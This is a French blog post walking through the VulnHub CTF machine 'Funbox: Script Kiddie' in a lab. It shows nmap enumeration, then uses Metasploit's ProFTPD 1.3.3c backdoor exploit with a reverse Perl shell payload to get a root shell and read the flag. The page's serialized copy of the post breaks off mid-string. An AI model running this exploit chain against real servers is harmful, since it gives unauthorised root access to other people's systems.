<!DOCTYPE html>
<html data-html-server-rendered="true" lang="fr" data-vue-tag="%7B%22lang%22:%7B%22ssr%22:%22fr%22%7D%7D">
  <head>
    <title>CTF Funbox: Script Kiddie - https://etienner.github.io</title><meta name="gridsome:hash" content="250f333e9ef0347f8247956a19dfdff7c411a751"><meta data-vue-tag="ssr" charset="utf-8"><meta data-vue-tag="ssr" name="generator" content="Gridsome v0.7.23"><meta data-vue-tag="ssr" data-key="viewport" name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover"><meta data-vue-tag="ssr" data-key="format-detection" name="format-detection" content="telephone=no"><meta data-vue-tag="ssr" name="description" content="Avant propos
Le d√©roul√© de ce hack a √©t√© r√©alis√© sur une machine pr√©vue √† cette effet. Il est interdit de mener ce genre d&#x27;action sur une machine qui ne vous appartient pas sans l&#x27;accord de son ou sa"><meta data-vue-tag="ssr" property="og:type" content="article"><meta data-vue-tag="ssr" property="og:title" content="CTF Funbox: Script Kiddie"><meta data-vue-tag="ssr" property="og:description" content="Avant propos
Le d√©roul√© de ce hack a √©t√© r√©alis√© sur une machine pr√©vue √† cette effet. Il est interdit de mener ce genre d&#x27;action sur une machine qui ne vous appartient pas sans l&#x27;accord de son ou sa"><meta data-vue-tag="ssr" property="og:url" content="https://etienner.github.io/ctf-funbox-script-kiddie/"><meta data-vue-tag="ssr" name="twitter:domain" content="https://etienner.github.io"><meta data-vue-tag="ssr" name="twitter:card" content="summary_large_image"><meta data-vue-tag="ssr" name="twitter:title" content="CTF Funbox: Script Kiddie"><meta data-vue-tag="ssr" name="twitter:description" content="Avant propos
Le d√©roul√© de ce hack a √©t√© r√©alis√© sur une machine pr√©vue √† cette effet. Il est interdit de mener ce genre d&#x27;action sur une machine qui ne vous appartient pas sans l&#x27;accord de son ou sa"><meta data-vue-tag="ssr" name="twitter:site" content="@etiennerouzeaud"><meta data-vue-tag="ssr" name="twitter:creator" content="@etiennerouzeaud"><link data-vue-tag="ssr" rel="icon" href="data:,"><link data-vue-tag="ssr" rel="icon" type="image/png" sizes="16x16" href="/assets/static/favicon.ce0531f.9bb7ffafafc09ac851d81afb65b8ef59.png"><link data-vue-tag="ssr" rel="icon" type="image/png" sizes="32x32" href="/assets/static/favicon.ac8d93a.9bb7ffafafc09ac851d81afb65b8ef59.png"><link data-vue-tag="ssr" rel="icon" type="image/png" sizes="96x96" href="/assets/static/favicon.b9532cc.9bb7ffafafc09ac851d81afb65b8ef59.png"><link data-vue-tag="ssr" rel="apple-touch-icon" type="image/png" sizes="76x76" href="/assets/static/favicon.f22e9f3.9bb7ffafafc09ac851d81afb65b8ef59.png"><link data-vue-tag="ssr" rel="apple-touch-icon" type="image/png" sizes="152x152" href="/assets/static/favicon.62d22cb.9bb7ffafafc09ac851d81afb65b8ef59.png"><link data-vue-tag="ssr" rel="apple-touch-icon" type="image/png" sizes="120x120" href="/assets/static/favicon.1539b60.9bb7ffafafc09ac851d81afb65b8ef59.png"><link data-vue-tag="ssr" rel="apple-touch-icon" type="image/png" sizes="167x167" href="/assets/static/favicon.dc0cdc5.9bb7ffafafc09ac851d81afb65b8ef59.png"><link data-vue-tag="ssr" rel="apple-touch-icon" type="image/png" sizes="180x180" href="/assets/static/favicon.7b22250.9bb7ffafafc09ac851d81afb65b8ef59.png"><link rel="preload" href="/assets/css/0.styles.9275371b.css" as="style"><link rel="preload" href="/assets/js/app.8f509c54.js" as="script"><link rel="preload" href="/assets/js/page--src-templates-post-vue.12e71a8f.js" as="script"><link rel="prefetch" href="/assets/js/page--node-modules-gridsome-app-pages-404-vue.b64bd371.js"><link rel="prefetch" href="/assets/js/page--src-pages-index-vue.15f2a9bd.js"><link rel="prefetch" href="/assets/js/page--src-templates-tag-vue.25185cf5.js"><link rel="stylesheet" href="/assets/css/0.styles.9275371b.css"><noscript data-vue-tag="ssr"><style>.g-image--loading{display:none;}</style></noscript>
  </head>
  <body >
    <div data-server-rendered="true" id="app"><header class="py-2 text-center"><strong><a href="/" title="Accueil" class="active">Etienne ROUZEAUD - D√©veloppeur Web</a></strong></header><main><div class="title py-2 text-center" data-v-2084d89c><h1 class="display-5 pt-2" data-v-2084d89c>CTF Funbox: Script Kiddie</h1><!----></div><div class="container"><div class="row sidebar"><div class="mt-4 col-lg-2"><p><em><span>15 ao√ªt 2021</span></em></p><ul class="list-unstyled"><li>
            üè∑Ô∏è <a href="/tag/Pentest/">Pentest</a></li><li>
            üè∑Ô∏è <a href="/tag/CTF/">CTF</a></li></ul><p>‚åö 4 mins de lecture</p><p><a href="https://www.vulnhub.com/entry/funbox-scriptkiddie,725" target="_blank" rel="noopener">
            üíæ T√©l√©chargement
          </a></p></div><div class="col-lg-10 mt-4"><ul class="list-group mb-4"><li class="list-group-item">
            Partie 1 :
            <span><a href="/ctf-funbox-easy">CTF Funbox: Easy</a></span></li><li class="list-group-item disabled">
            Partie 2 :
            <span>CTF Funbox: Script Kiddie</span></li></ul><article><h2>Avant propos</h2>
<p>Le d√©roul√© de ce hack a √©t√© r√©alis√© sur une machine pr√©vue √† cette effet. Il est interdit de mener ce genre d'action sur une machine qui ne vous appartient pas sans l'accord de son ou sa propri√©taire.<br>
Ce CTF a √©t√© r√©alis√© avec une machine attaquante <strong>Kali 2021.2</strong> (<code class="language-text">lsb_release -r</code>).</p>
<h2>Enum√©ration</h2>
<p>On r√©cup√®re l'adresse IP de la machine distante avec <strong>Netdiscover</strong> <code class="language-text">sudo netdiscover</code>.<br>
Avant de poursuivre, on exporte cette adresse dans une variable pour √™tre tranquille par la suite <code class="language-text">export IP=192.168.1.17</code>.<br>
Puis on cr√©√© un dossier d√©di√© √† ce CTF <code class="language-text">cd Documents/ctf &amp;&amp; mkdir FunboxScriptKiddie &amp;&amp; cd FunboxScriptKiddie</code>.<br>
On lance <strong>Nmap</strong> pour scanner les ports de la machine distante.</p>
<div class="gridsome-highlight" data-language="bash"><pre style="counter-reset: linenumber NaN" class="language-bash line-numbers"><code class="language-bash">$ nmap -sV -sT -p- <span class="token variable">$IP</span> -oN nmap.txt
PORT    STATE SERVICE     VERSION
<span class="token number">21</span>/tcp  <span class="token function">open</span>  <span class="token function">ftp</span>         ProFTPD <span class="token number">1.3</span>.3c
<span class="token number">22</span>/tcp  <span class="token function">open</span>  <span class="token function">ssh</span>         OpenSSH <span class="token number">7</span>.2p2 Ubuntu 4ubuntu2.10 <span class="token punctuation">(</span>Ubuntu Linux<span class="token punctuation">;</span> protocol <span class="token number">2.0</span><span class="token punctuation">)</span>
<span class="token number">25</span>/tcp  <span class="token function">open</span>  smtp        Postfix smtpd
<span class="token number">80</span>/tcp  <span class="token function">open</span>  http        Apache httpd <span class="token number">2.4</span>.18 <span class="token variable"><span class="token punctuation">((</span>Ubuntu<span class="token punctuation">))</span></span>
<span class="token number">110</span>/tcp <span class="token function">open</span>  pop3        Dovecot pop3d
<span class="token number">139</span>/tcp <span class="token function">open</span>  netbios-ssn Samba smbd <span class="token number">3</span>.X - <span class="token number">4</span>.X <span class="token punctuation">(</span>workgroup: WORKGROUP<span class="token punctuation">)</span>
<span class="token number">143</span>/tcp <span class="token function">open</span>  imap        Dovecot imapd
<span class="token number">445</span>/tcp <span class="token function">open</span>  netbios-ssn Samba smbd <span class="token number">3</span>.X - <span class="token number">4</span>.X <span class="token punctuation">(</span>workgroup: WORKGROUP<span class="token punctuation">)</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>On a une liste de 8 serveurs :</p>
<ul>
<li><strong>21</strong> un serveur <strong>FTP</strong> ;</li>
<li><strong>22</strong> un serveur <strong>SSH</strong> ;</li>
<li><strong>25</strong> un serveur <strong>SMTP</strong> ;</li>
<li><strong>80</strong> un serveur <strong>Apache</strong> 2.4.18 ;</li>
<li><strong>110</strong> un serveur <strong>POP3</strong> ;</li>
<li><strong>139</strong> et <strong>445</strong> un serveur <strong>Samba</strong> ;</li>
<li><strong>143</strong> un serveur <strong>IMAP</strong>.</li>
</ul>
<p>On check le serveur <strong>FTP</strong>.</p>
<div class="gridsome-highlight" data-language="bash"><pre style="counter-reset: linenumber NaN" class="language-bash line-numbers"><code class="language-bash">$ <span class="token function">ftp</span> <span class="token variable">$IP</span>
Connected to <span class="token number">192.168</span>.1.17.
<span class="token number">220</span> ProFTPD <span class="token number">1.3</span>.3c Server <span class="token punctuation">(</span>ProFTPD Default Installation<span class="token punctuation">)</span> <span class="token punctuation">[</span><span class="token number">192.168</span>.1.17<span class="token punctuation">]</span>
Name <span class="token punctuation">(</span><span class="token number">192.168</span>.1.17:kali<span class="token punctuation">)</span>: anonymous
<span class="token number">331</span> Anonymous login ok, send your complete email address as your password
Password:
<span class="token number">530</span> Login incorrect.
Login failed.
ftp<span class="token operator">></span> <span class="token builtin class-name">exit</span>
<span class="token number">221</span> Goodbye.</code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>Sans grand succ√®s, par contre lorsque l'on regarde sur <strong>searchsploit</strong> pour <strong>ProFTPD 1.3.3c</strong>, on a un r√©sultat exploitable avec <strong>Metasploit</strong>.</p>
<div class="gridsome-highlight" data-language="bash"><pre style="counter-reset: linenumber NaN" class="language-bash line-numbers"><code class="language-bash">ProFTPd <span class="token number">1.3</span>.3c - Compromised Source Backdoor Remote Code Execution <span class="token operator">|</span> linux/remote/15662.txt
ProFTPd-1.3.3c - Backdoor Command Execution <span class="token punctuation">(</span>Metasploit<span class="token punctuation">)</span> <span class="token operator">|</span> linux/remote/16921.rb</code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span></span></pre></div>
<h2>P√©n√©tration</h2>
<p>On lance donc ce dernier via la commande <strong>msfconsole</strong>.</p>
<div class="gridsome-highlight" data-language="bash"><pre style="counter-reset: linenumber NaN" class="language-bash line-numbers"><code class="language-bash">$ msfconsole
msf6 <span class="token operator">></span> search ProFTPd-1.3.3c
<span class="token comment">#  Name                                    Disclosure Date  Rank       Check  Description</span>
-  ----                                    ---------------  ----       -----  -----------
<span class="token number">0</span>  exploit/unix/ftp/proftpd_133c_backdoor  <span class="token number">2010</span>-12-02       excellent  No     ProFTPD-1.3.3c Backdoor Command Execution</code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>On retrouve bien l'exploit que l'on veut utiliser.</p>
<div class="gridsome-highlight" data-language="bash"><pre style="counter-reset: linenumber NaN" class="language-bash line-numbers"><code class="language-bash">msf6 <span class="token operator">></span> use <span class="token number">0</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span></span></pre></div>
<p>Avant de poursuivre, on regarde les options disponibles.</p>
<div class="gridsome-highlight" data-language="bash"><pre style="counter-reset: linenumber NaN" class="language-bash line-numbers"><code class="language-bash">msf6 exploit<span class="token punctuation">(</span>unix/ftp/proftpd_133c_backdoor<span class="token punctuation">)</span> <span class="token operator">></span> show options
Name    Current Setting  Required  Description
----    ---------------  --------  -----------
RHOSTS                   <span class="token function">yes</span>       The target host<span class="token punctuation">(</span>s<span class="token punctuation">)</span>, range CIDR identifier, or hosts <span class="token function">file</span> with syntax <span class="token string">'file:&lt;path>'</span>
RPORT   <span class="token number">21</span>               <span class="token function">yes</span>       The target port <span class="token punctuation">(</span>TCP<span class="token punctuation">)</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>On commence par renseigner l'IP de la machine distante dans la variable "RHOST".</p>
<div class="gridsome-highlight" data-language="bash"><pre style="counter-reset: linenumber NaN" class="language-bash line-numbers"><code class="language-bash">msf6 exploit<span class="token punctuation">(</span>unix/ftp/proftpd_133c_backdoor<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token builtin class-name">set</span> RHOST <span class="token number">192.168</span>.1.17
RHOST <span class="token operator">=</span><span class="token operator">></span> <span class="token number">192.168</span>.1.17</code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span></span></pre></div>
<p>Puis on consulte la liste des payloads disponibles.</p>
<div class="gridsome-highlight" data-language="bash"><pre style="counter-reset: linenumber NaN" class="language-bash line-numbers"><code class="language-bash">msf6 exploit<span class="token punctuation">(</span>unix/ftp/proftpd_133c_backdoor<span class="token punctuation">)</span> <span class="token operator">></span> show payloads
<span class="token comment">#  Name                                        Disclosure Date  Rank    Check  Description</span>
-  ----                                        ---------------  ----    -----  -----------
<span class="token number">0</span>  payload/cmd/unix/bind_perl                                   normal  No     Unix Command Shell, Bind TCP <span class="token punctuation">(</span>via Perl<span class="token punctuation">)</span>
<span class="token number">1</span>  payload/cmd/unix/bind_perl_ipv6                              normal  No     Unix Command Shell, Bind TCP <span class="token punctuation">(</span>via perl<span class="token punctuation">)</span> IPv6
<span class="token number">2</span>  payload/cmd/unix/generic                                     normal  No     Unix Command, Generic Command Execution
<span class="token number">3</span>  payload/cmd/unix/reverse                                     normal  No     Unix Command Shell, Double Reverse TCP <span class="token punctuation">(</span>telnet<span class="token punctuation">)</span>
<span class="token number">4</span>  payload/cmd/unix/reverse_bash_telnet_ssl                     normal  No     Unix Command Shell, Reverse TCP SSL <span class="token punctuation">(</span>telnet<span class="token punctuation">)</span>
<span class="token number">5</span>  payload/cmd/unix/reverse_perl                                normal  No     Unix Command Shell, Reverse TCP <span class="token punctuation">(</span>via Perl<span class="token punctuation">)</span>
<span class="token number">6</span>  payload/cmd/unix/reverse_perl_ssl                            normal  No     Unix Command Shell, Reverse TCP SSL <span class="token punctuation">(</span>via perl<span class="token punctuation">)</span>
<span class="token number">7</span>  payload/cmd/unix/reverse_ssl_double_telnet                   normal  No     Unix Command Shell, Double Reverse TCP SSL <span class="token punctuation">(</span>telnet<span class="token punctuation">)</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>On choisit le reverse en PERL dans la variable "payload".</p>
<div class="gridsome-highlight" data-language="bash"><pre style="counter-reset: linenumber NaN" class="language-bash line-numbers"><code class="language-bash">msf6 exploit<span class="token punctuation">(</span>unix/ftp/proftpd_133c_backdoor<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token builtin class-name">set</span> payload <span class="token number">5</span>
payload <span class="token operator">=</span><span class="token operator">></span> cmd/unix/reverse_perl</code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span></span></pre></div>
<p>Et on n'oublie pas de renseigner l'IP la machine locale dans la variable "LHOST".</p>
<div class="gridsome-highlight" data-language="bash"><pre style="counter-reset: linenumber NaN" class="language-bash line-numbers"><code class="language-bash">msf6 exploit<span class="token punctuation">(</span>unix/ftp/proftpd_133c_backdoor<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token builtin class-name">set</span> LHOST <span class="token number">192.168</span>.1.33
LHOST <span class="token operator">=</span><span class="token operator">></span> <span class="token number">192.168</span>.1.33</code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span></span></pre></div>
<p>Nos 3 valeurs renseign√©es, on peut ex√©cuter l'exploit.</p>
<div class="gridsome-highlight" data-language="bash"><pre style="counter-reset: linenumber NaN" class="language-bash line-numbers"><code class="language-bash">msf6 exploit<span class="token punctuation">(</span>unix/ftp/proftpd_133c_backdoor<span class="token punctuation">)</span> <span class="token operator">></span> exploit
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Started reverse TCP handler on <span class="token number">192.168</span>.1.33:4444 
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">192.168</span>.1.17:21 - Sending Backdoor Command
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Command shell session <span class="token number">1</span> opened <span class="token punctuation">(</span><span class="token number">192.168</span>.1.33:4444 -<span class="token operator">></span> <span class="token number">192.168</span>.1.17:44782<span class="token punctuation">)</span> at <span class="token number">2021</span>-08-15 <span class="token number">10</span>:58:28 +0200</code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span></span></pre></div>
<p>L'exploit fonctionne car on est connect√© sur le serveur <strong>FTP</strong>.</p>
<div class="gridsome-highlight" data-language="bash"><pre style="counter-reset: linenumber NaN" class="language-bash line-numbers"><code class="language-bash">$ <span class="token function">id</span>
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span>,65534<span class="token punctuation">(</span>nogroup<span class="token punctuation">)</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span></span></pre></div>
<p>On est directement utilisateur <strong>root</strong>. On lance un <strong>shell</strong> pour mieux naviguer sur la machine distante.</p>
<div class="gridsome-highlight" data-language="bash"><pre style="counter-reset: linenumber NaN" class="language-bash line-numbers"><code class="language-bash">$ shell
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Trying to <span class="token function">find</span> binary <span class="token string">'python'</span> on the target machine
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Found python at /usr/bin/python
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Using <span class="token variable"><span class="token variable">`</span>python<span class="token variable">`</span></span> to pop up an interactive shell
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Trying to <span class="token function">find</span> binary <span class="token string">'bash'</span> on the target machine
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Found <span class="token function">bash</span> at /bin/bash</code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>On trouve l'unique flag dans le r√©pertoire de l'utilisateur <strong>root</strong>.</p>
<div class="gridsome-highlight" data-language="bash"><pre style="counter-reset: linenumber NaN" class="language-bash line-numbers"><code class="language-bash">$ <span class="token function">cat</span> /root/root.txt
Please, tweet this to: @0815R2d2
Thank you<span class="token punctuation">..</span>.</code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span></span></pre></div>
</article></div></div></div></main><footer class="text-white mt-4"><ul class="nav nav-pills justify-content-center"><li><a href="https://github.com/etienner" target="_blank" rel="noopener" class="nav-link">Github</a></li><li><a href="https://medium.com/@etiennerouzeaud" target="_blank" rel="noopener" class="nav-link">Medium</a></li><li><a href="https://twitter.com/etiennerouzeaud" target="_blank" rel="noopener" class="nav-link">Twitter</a></li></ul></footer></div>
    <script>window.__INITIAL_STATE__={"data":{"post":{"title":"CTF Funbox: Script Kiddie","date":"15 August 2021","content":"\u003Ch2\u003EAvant propos\u003C\u002Fh2\u003E\n\u003Cp\u003ELe d√©roul√© de ce hack a √©t√© r√©alis√© sur une machine pr√©vue √† cette effet. Il est interdit de mener ce genre d'action sur une machine qui ne vous appartient pas sans l'accord de son ou sa propri√©taire.\u003Cbr\u003E\nCe CTF a √©t√© r√©alis√© avec une machine attaquante \u003Cstrong\u003EKali 2021.2\u003C\u002Fstrong\u003E (\u003Ccode class=\"language-text\"\u003Elsb_release -r\u003C\u002Fcode\u003E).\u003C\u002Fp\u003E\n\u003Ch2\u003EEnum√©ration\u003C\u002Fh2\u003E\n\u003Cp\u003EOn r√©cup√®re l'adresse IP de la machine distante avec \u003Cstrong\u003ENetdiscover\u003C\u002Fstrong\u003E \u003Ccode class=\"language-text\"\u003Esudo netdiscover\u003C\u002Fcode\u003E.\u003Cbr\u003E\nAvant de poursuivre, on exporte cette adresse dans une variable pour √™tre tranquille par la suite \u003Ccode class=\"language-text\"\u003Eexport IP=192.168.1.17\u003C\u002Fcode\u003E.\u003Cbr\u003E\nPuis on cr√©√© un dossier d√©di√© √† ce CTF \u003Ccode class=\"language-text\"\u003Ecd Documents\u002Fctf &amp;&amp; mkdir FunboxScriptKiddie &amp;&amp; cd FunboxScriptKiddie\u003C\u002Fcode\u003E.\u003Cbr\u003E\nOn lance \u003Cstrong\u003ENmap\u003C\u002Fstrong\u003E pour scanner les ports de la machine distante.\u003C\u002Fp\u003E\n\u003Cdiv class=\"gridsome-highlight\" data-language=\"bash\"\u003E\u003Cpre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"\u003E\u003Ccode class=\"language-bash\"\u003E$ nmap -sV -sT -p- \u003Cspan class=\"token variable\"\u003E$IP\u003C\u002Fspan\u003E -oN nmap.txt\nPORT    STATE SERVICE     VERSION\n\u003Cspan class=\"token number\"\u003E21\u003C\u002Fspan\u003E\u002Ftcp  \u003Cspan class=\"token function\"\u003Eopen\u003C\u002Fspan\u003E  \u003Cspan class=\"token function\"\u003Eftp\u003C\u002Fspan\u003E         ProFTPD \u003Cspan class=\"token number\"\u003E1.3\u003C\u002Fspan\u003E.3c\n\u003Cspan class=\"token number\"\u003E22\u003C\u002Fspan\u003E\u002Ftcp  \u003Cspan class=\"token function\"\u003Eopen\u003C\u002Fspan\u003E  \u003Cspan class=\"token function\"\u003Essh\u003C\u002Fspan\u003E         OpenSSH \u003Cspan class=\"token number\"\u003E7\u003C\u002Fspan\u003E.2p2 Ubuntu 4ubuntu2.10 \u003Cspan class=\"token punctuation\"\u003E(\u003C\u002Fspan\u003EUbuntu Linux\u003Cspan class=\"token punctuation\"\u003E;\u003C\u002Fspan\u003E protocol \u003Cspan class=\"token number\"\u003E2.0\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E)\u003C\u002Fspan\u003E\n\u003Cspan class=\"token number\"\u003E25\u003C\u002Fspan\u003E\u002Ftcp  \u003Cspan class=\"token function\"\u003Eopen\u003C\u002Fspan\u003E  smtp        Postfix smtpd\n\u003Cspan class=\"token number\"\u003E80\u003C\u002Fspan\u003E\u002Ftcp  \u003Cspan class=\"token function\"\u003Eopen\u003C\u002Fspan\u003E  http        Apache httpd \u003Cspan class=\"token number\"\u003E2.4\u003C\u002Fspan\u003E.18 \u003Cspan class=\"token variable\"\u003E\u003Cspan class=\"token punctuation\"\u003E((\u003C\u002Fspan\u003EUbuntu\u003Cspan class=\"token punctuation\"\u003E))\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\n\u003Cspan class=\"token number\"\u003E110\u003C\u002Fspan\u003E\u002Ftcp \u003Cspan class=\"token function\"\u003Eopen\u003C\u002Fspan\u003E  pop3        Dovecot pop3d\n\u003Cspan class=\"token number\"\u003E139\u003C\u002Fspan\u003E\u002Ftcp \u003Cspan class=\"token function\"\u003Eopen\u003C\u002Fspan\u003E  netbios-ssn Samba smbd \u003Cspan class=\"token number\"\u003E3\u003C\u002Fspan\u003E.X - \u003Cspan class=\"token number\"\u003E4\u003C\u002Fspan\u003E.X \u003Cspan class=\"token punctuation\"\u003E(\u003C\u002Fspan\u003Eworkgroup: WORKGROUP\u003Cspan class=\"token punctuation\"\u003E)\u003C\u002Fspan\u003E\n\u003Cspan class=\"token number\"\u003E143\u003C\u002Fspan\u003E\u002Ftcp \u003Cspan class=\"token function\"\u003Eopen\u003C\u002Fspan\u003E  imap        Dovecot imapd\n\u003Cspan class=\"token number\"\u003E445\u003C\u002Fspan\u003E\u002Ftcp \u003Cspan class=\"token function\"\u003Eopen\u003C\u002Fspan\u003E  netbios-ssn Samba smbd \u003Cspan class=\"token number\"\u003E3\u003C\u002Fspan\u003E.X - \u003Cspan class=\"token number\"\u003E4\u003C\u002Fspan\u003E.X \u003Cspan class=\"token punctuation\"\u003E(\u003C\u002Fspan\u003Eworkgroup: WORKGROUP\u003Cspan class=\"token punctuation\"\u003E)\u003C\u002Fspan\u003E\u003C\u002Fcode\u003E\u003Cspan aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fpre\u003E\u003C\u002Fdiv\u003E\n\u003Cp\u003EOn a une liste de 8 serveurs :\u003C\u002Fp\u003E\n\u003Cul\u003E\n\u003Cli\u003E\u003Cstrong\u003E21\u003C\u002Fstrong\u003E un serveur \u003Cstrong\u003EFTP\u003C\u002Fstrong\u003E ;\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Cstrong\u003E22\u003C\u002Fstrong\u003E un serveur \u003Cstrong\u003ESSH\u003C\u002Fstrong\u003E ;\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Cstrong\u003E25\u003C\u002Fstrong\u003E un serveur \u003Cstrong\u003ESMTP\u003C\u002Fstrong\u003E ;\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Cstrong\u003E80\u003C\u002Fstrong\u003E un serveur \u003Cstrong\u003EApache\u003C\u002Fstrong\u003E 2.4.18 ;\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Cstrong\u003E110\u003C\u002Fstrong\u003E un serveur \u003Cstrong\u003EPOP3\u003C\u002Fstrong\u003E ;\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Cstrong\u003E139\u003C\u002Fstrong\u003E et \u003Cstrong\u003E445\u003C\u002Fstrong\u003E un serveur \u003Cstrong\u003ESamba\u003C\u002Fstrong\u003E ;\u003C\u002Fli\u003E\n\u003Cli\u003E\u003Cstrong\u003E143\u003C\u002Fstrong\u003E un serveur \u003Cstrong\u003EIMAP\u003C\u002Fstrong\u003E.\u003C\u002Fli\u003E\n\u003C\u002Ful\u003E\n\u003Cp\u003EOn check le serveur \u003Cstrong\u003EFTP\u003C\u002Fstrong\u003E.\u003C\u002Fp\u003E\n\u003Cdiv class=\"gridsome-highlight\" data-language=\"bash\"\u003E\u003Cpre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"\u003E\u003Ccode class=\"language-bash\"\u003E$ \u003Cspan class=\"token function\"\u003Eftp\u003C\u002Fspan\u003E \u003Cspan class=\"token variable\"\u003E$IP\u003C\u002Fspan\u003E\nConnected to \u003Cspan class=\"token number\"\u003E192.168\u003C\u002Fspan\u003E.1.17.\n\u003Cspan class=\"token number\"\u003E220\u003C\u002Fspan\u003E ProFTPD \u003Cspan class=\"token number\"\u003E1.3\u003C\u002Fspan\u003E.3c Server \u003Cspan class=\"token punctuation\"\u003E(\u003C\u002Fspan\u003EProFTPD Default Installation\u003Cspan class=\"token punctuation\"\u003E)\u003C\u002Fspan\u003E \u003Cspan class=\"token punctuation\"\u003E[\u003C\u002Fspan\u003E\u003Cspan class=\"token number\"\u003E192.168\u003C\u002Fspan\u003E.1.17\u003Cspan class=\"token punctuation\"\u003E]\u003C\u002Fspan\u003E\nName \u003Cspan class=\"token punctuation\"\u003E(\u003C\u002Fspan\u003E\u003Cspan class=\"token number\"\u003E192.168\u003C\u002Fspan\u003E.1.17:kali\u003Cspan class=\"token punctuation\"\u003E)\u003C\u002Fspan\u003E: anonymous\n\u003Cspan class=\"token number\"\u003E331\u003C\u002Fspan\u003E Anonymous login ok, send your complete email address as your password\nPassword:\n\u003Cspan class=\"token number\"\u003E530\u003C\u002Fspan\u003E Login incorrect.\nLogin failed.\nftp\u003Cspan class=\"token operator\"\u003E\u003E\u003C\u002Fspan\u003E \u003Cspan class=\"token builtin class-name\"\u003Eexit\u003C\u002Fspan\u003E\n\u003Cspan class=\"token number\"\u003E221\u003C\u002Fspan\u003E Goodbye.\u003C\u002Fcode\u003E\u003Cspan aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fpre\u003E\u003C\u002Fdiv\u003E\n\u003Cp\u003ESans grand succ√®s, par contre lorsque l'on regarde sur \u003Cstrong\u003Esearchsploit\u003C\u002Fstrong\u003E pour \u003Cstrong\u003EProFTPD 1.3.3c\u003C\u002Fstrong\u003E, on a un r√©sultat exploitable avec \u003Cstrong\u003EMetasploit\u003C\u002Fstrong\u003E.\u003C\u002Fp\u003E\n\u003Cdiv class=\"gridsome-highlight\" data-language=\"bash\"\u003E\u003Cpre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"\u003E\u003Ccode class=\"language-bash\"\u003EProFTPd \u003Cspan class=\"token number\"\u003E1.3\u003C\u002Fspan\u003E.3c - Compromised Source Backdoor Remote Code Execution 